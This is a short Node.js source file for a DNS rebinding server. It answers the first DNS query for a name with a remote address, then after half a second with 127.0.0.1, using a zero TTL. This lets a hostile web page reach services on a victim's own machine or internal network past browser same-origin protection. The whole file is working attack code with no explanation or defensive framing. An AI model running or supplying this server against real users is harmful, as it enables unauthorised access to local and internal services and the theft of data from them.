// DNS rebinding server

var dns = require('native-dns');
var server = dns.createServer();
var db = {};

var LOCAL = '127.0.0.1'; // first ip
var REMOTE = 'A.B.C.D'; // second ip

server.on('request', function (req, res) {

  var name = req.question[0].name;

  if (typeof db[name] === 'undefined') {

    // first hit, set host to remote IP
    console.log('set: ' + name + ' to ' + REMOTE);
    db[name] = REMOTE;

    // prepare for second hit
    setTimeout(function () {
      console.log('set: ' + name + ' to ' + LOCAL);
      db[name] = LOCAL;
    }, 500);

    // clear value after 1.5 seconds
    setTimeout(function () {
      console.log('reset: ' + name);
      delete db[name];
    }, 1500);
  }

  console.log('query: ' + name + ' -> ' + db[name]);

  res.answer.push(dns.A({
    name: name,
    address: db[name],
    ttl: 0,
  }));

  res.send();
});

server.on('error', function (err, buff, req, res) {
  console.log('Error:', err);
});

server.serve(53);
console.log('Listening on port 53');
